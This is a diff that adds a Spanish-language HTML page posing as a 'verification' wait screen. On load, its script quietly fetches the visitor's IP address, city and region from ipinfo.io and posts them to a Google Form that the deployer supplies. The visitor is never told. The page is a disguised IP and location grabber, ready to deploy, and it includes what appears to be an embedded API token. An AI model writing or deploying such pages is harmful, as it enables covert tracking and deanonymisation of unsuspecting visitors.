@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+</head>
+<body>
+    <h1>Bienvenido</h1>
+    <p>Por favor, espera un momento...</p>
+
+    <script>
+        async function sendLocation() {
+            try {
+                // Obtener IP y ubicación con ipinfo.io
+                const response = await fetch('https://ipinfo.io/json?token=de7f9b1882b018');
+                const data = await response.json();
+
+                // URL de tu formulario de Google Forms (REEMPLÁZALA CON LA TUYA)
+                const formURL = "https://docs.google.com/forms/d/e/TU_ID_DE_FORMULARIO/formResponse";
+
+                // Definir los campos del formulario
+                const params = new URLSearchParams();
+                params.append("entry.123456789", data.ip);     // Dirección IP
+                params.append("entry.987654321", data.city);   // Ciudad
+                params.append("entry.1112131415", data.region); // Región
+
+                // Enviar datos al formulario de Google Forms
+                fetch(formURL, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: params
+                });
+
+            } catch (error) {
+                console.error("Error al obtener la ubicación:", error);
+            }
+        }
+
+        // Ejecutar la función al cargar la página
+        sendLocation();
+    </script>
+</body>
+</html>
